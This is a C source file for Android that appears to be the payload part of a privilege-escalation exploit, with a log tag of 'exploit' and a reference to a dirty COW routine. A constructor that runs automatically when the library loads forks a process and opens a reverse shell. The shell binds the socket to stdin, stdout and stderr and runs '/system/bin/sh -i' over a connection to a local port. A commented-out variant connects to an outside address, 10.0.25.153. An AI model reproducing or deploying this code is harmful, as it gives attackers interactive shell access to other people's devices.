#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 5001

#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <jni.h>


#include <dlfcn.h>
#include <fcntl.h>

#include "lsh.h"

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

//reduce binary size
char __aeabi_unwind_cpp_pr0[0];

typedef int getcon_t(char ** con);
typedef int setcon_t(const char* con);

extern int dcow(int argc, const char *argv[]);
void lsh_loop();

void lsh_shell() {
	int resultfd, sockfd;

	int port = 11112;
	struct sockaddr_in my_addr;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sockfd < 0)
	{
		LOGV("no socket\n");
		return;
	}

	LOGV("socket %d\n", sockfd);
	if (0) {
		int one = 1;
		setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
		memset(&my_addr, 0, sizeof(my_addr));
		my_addr.sin_family = AF_INET;
		my_addr.sin_port = htons(port);
		my_addr.sin_addr.s_addr = INADDR_ANY;

		bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
		listen(sockfd, 0);

		resultfd = accept(sockfd, NULL, NULL);
		if(resultfd < 0)
		{
			return;
		}
	} else {
		memset(&my_addr,0,sizeof(my_addr));
		my_addr.sin_family = AF_INET;
		my_addr.sin_port = htons(port);
		my_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
		LOGV("connect %d\n", sockfd);
		connect(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
		LOGV("result %d\n", sockfd);
		resultfd = sockfd;
	}

	dup2(resultfd, 2);
	dup2(resultfd, 1);
	dup2(resultfd, 0);

	LOGV("dup %d\n", sockfd);
	system("/system/bin/sh -i");
	LOGV("done %d\n", sockfd);

	/*char * args[]={"/system/bin/sh", "/system/bin/sh", "-i", NULL};*/
	/*pid_t pid;*/
	/*int status;*/
	/*pid = fork();*/
	/*if (pid == 0) {*/
		/*// Child process*/
		/*if (execvp(args[0], args) == -1) {*/
			/*LOGV("execvp error");*/
		/*}*/
		/*exit(EXIT_FAILURE);*/
	/*} else if (pid < 0) {*/
		/*// Error forking*/
		/*LOGV("fork error");*/
	/*} else {*/
		/*// Parent process*/
		/*do {*/
			/*waitpid(pid, &status, WUNTRACED);*/
		/*} while (!WIFEXITED(status) && !WIFSIGNALED(status));*/
	/*}*/

	/*execvp(argv[0], argv);*/
	// syscall 11

	LOGV("done exec uid %d", getuid());
}

static void con() __attribute__((constructor));
void con() 
{
	/*LOGV("uid %d", getuid());*/
  /*if (setresgid(0, 0, 0) || setresuid(0, 0, 0)) {*/
    /*LOGV("setresgid/setresuid failed");*/
  /*}*/
	
	LOGV("uid %d", getuid());
	char buf[255];
	int fd = open("/proc/self/cmdline",O_RDONLY);
	read(fd, buf, 255);
	LOGV("buf %s", buf);

  pid_t pid = fork();
	if (pid == 0) {
		lsh_shell();

		/*int sock = socket(AF_INET, SOCK_STREAM, 0);*/
		/*struct sockaddr_in serv_addr = {0};*/
		/*serv_addr.sin_family = AF_INET;*/
		/*serv_addr.sin_port = htons(5000);*/
		/*serv_addr.sin_addr.s_addr = inet_addr("10.0.25.153");*/
		/*if(connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) != 0) {*/
			/*LOGV("could not connect");*/
		/*}*/
		/*dup2(sock, 0);*/
		/*dup2(sock, 1);*/
		/*dup2(sock, 2);*/
		/*execl("/system/bin/sh", "/system/bin/sh", "-i", NULL);*/

		LOGV("exiting.\n");
	} else {
		LOGV("done %s", buf);
	}


}



